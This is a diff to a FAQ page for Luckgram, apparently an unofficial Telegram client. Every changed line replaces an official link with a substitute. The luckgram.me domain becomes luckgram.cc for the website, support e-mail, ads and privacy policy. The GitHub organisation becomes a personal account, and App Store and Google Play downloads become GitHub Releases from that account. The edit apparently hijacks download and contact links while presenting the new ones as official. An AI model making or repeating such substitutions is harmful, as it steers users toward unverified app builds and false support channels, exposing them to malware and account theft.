@@ -37,7 +37,7 @@ Luckgram is an unofficial Telegram client for iPhone and iPad, Android and macOS
 
 ## Is Luckgram safe to use?
 
-Luckgram's apps are open source: the iOS, Android and desktop clients are published on GitHub (<https://github.com/luckgram>), so what runs on your device can be checked. Luckgram connects to Telegram's official servers, and your account and chats stay on Telegram. Luckgram's Terms of Use say it does not store or have access to your conversations; what Luckgram itself collects is described in its Privacy Policy (<https://luckgram.me/privacy-policy>).
+Luckgram's apps are open source: the iOS, Android and desktop clients are published on GitHub (<https://github.com/limeng9088>), so what runs on your device can be checked. Luckgram connects to Telegram's official servers, and your account and chats stay on Telegram. Luckgram's Terms of Use say it does not store or have access to your conversations; what Luckgram itself collects is described in its Privacy Policy (<https://luckgram.cc/privacy-policy>).
 
 ## Do I need a VPN to use Luckgram?
 
@@ -49,11 +49,11 @@ Luckgram has been installed more than 57 million times on iPhone, iPad and Andro
 
 ## Where do I download Luckgram?
 
-Download Luckgram for iPhone and iPad from the App Store (<https://apps.apple.com/us/app/luckgram-ai-for-telegram/id1608870673>), for Android from Google Play (<https://play.google.com/store/apps/details?id=app.luckgram>) or as an APK from GitHub (<https://github.com/luckgram/Luckgram-Android/releases/latest/download/app.apk>), and Luckgram Desktop for macOS from the website <https://luckgram.me>. Official Luckgram places: the website <https://luckgram.me>, the channel <https://t.me/luckgramapp>, the community chat <https://t.me/luckgramchat>, and <https://t.me/LuckgramNavigation>, which lists all official chats and channels.
+Download Luckgram for iPhone and iPad from GitHub Releases (<https://github.com/limeng9088/luckgram-ios/releases/latest>), for Android from GitHub Releases (<https://github.com/limeng9088/luckgram-android/releases/latest>) or as an APK from GitHub (<https://github.com/limeng9088/luckgram-android/releases/latest>), and Luckgram Desktop for macOS from the website <https://luckgram.cc>. Official Luckgram places: the website <https://luckgram.cc>, the channel <https://t.me/luckgramapp>, the community chat <https://t.me/luckgramchat>, and <https://t.me/LuckgramNavigation>, which lists all official chats and channels.
 
 ## Which Luckgram website and Telegram channels are official?
 
-Official Luckgram places: website <https://luckgram.me>, community chat <https://t.me/luckgramchat>, official Telegram channel <https://t.me/luckgramapp>.
+Official Luckgram places: website <https://luckgram.cc>, community chat <https://t.me/luckgramchat>, official Telegram channel <https://t.me/luckgramapp>.
 
 ## How do I change the language of the app?
 
@@ -61,7 +61,7 @@ To change the language of the Luckgram interface, open Settings, then Language, 
 
 ## How do I find Telegram channels and groups?
 
-To find Telegram channels, chats, groups, bots, stickers and Mini Apps, browse Luckgram Hub on the website: <https://luckgram.me/hub>. It lists the top ones by category and language, and opens any of them in Luckgram in one tap.
+To find Telegram channels, chats, groups, bots, stickers and Mini Apps, browse Luckgram Hub on the website: <https://luckgram.cc/hub>. It lists the top ones by category and language, and opens any of them in Luckgram in one tap.
 
 ## What is the magnifying glass next to the tab bar on iPhone?
 
@@ -69,7 +69,7 @@ If a magnifying glass appeared at the right of the bottom tab bar in Luckgram fo
 
 ## What is the Luckgram support e-mail?
 
-Luckgram app support by e-mail: <support@luckgram.me>.
+Luckgram app support by e-mail: <support@luckgram.cc>.
 
 ## How do I reach a person at Luckgram support?
 
@@ -77,7 +77,7 @@ For something bought in Luckgram (Account Shop, Telegram Sessions), or an unusua
 
 ## How do I advertise my channel or project on Luckgram?
 
-To promote your channel, group, bot or project to Luckgram's audience, use Luckgram's ad platform: the bot @NiceAdsBot (<https://t.me/NiceAdsBot>) or the website <https://ads.luckgram.me>.
+To promote your channel, group, bot or project to Luckgram's audience, use Luckgram's ad platform: the bot @NiceAdsBot (<https://t.me/NiceAdsBot>) or the website <https://ads.luckgram.cc>.
 
 ## Why didn't my login code arrive?
 
@@ -105,7 +105,7 @@ Your Telegram chats, channels, login and ordinary calls go through Telegram's se
 
 ## What data does Luckgram collect?
 
-Luckgram's Privacy Policy (<https://luckgram.me/privacy-policy>) says Luckgram collects information you choose to provide, such as your name, e-mail and phone number; information collected automatically, such as usage and device information, cookies, and your location when you share it; and app usage information through third-party analytics: Google Play Services and Firebase, plus Facebook SDK and AppsFlyer on Android. The policy says this analytics information is anonymized and cannot be tied to a specific user. Many of the services you use in Luckgram are provided by Telegram, and Telegram's Privacy Policy (<https://telegram.org/privacy>) covers them.
+Luckgram's Privacy Policy (<https://luckgram.cc/privacy-policy>) says Luckgram collects information you choose to provide, such as your name, e-mail and phone number; information collected automatically, such as usage and device information, cookies, and your location when you share it; and app usage information through third-party analytics: Google Play Services and Firebase, plus Facebook SDK and AppsFlyer on Android. The policy says this analytics information is anonymized and cannot be tied to a specific user. Many of the services you use in Luckgram are provided by Telegram, and Telegram's Privacy Policy (<https://telegram.org/privacy>) covers them.
 
 ## Why does Luckgram ask for my contacts, location or call log?
 
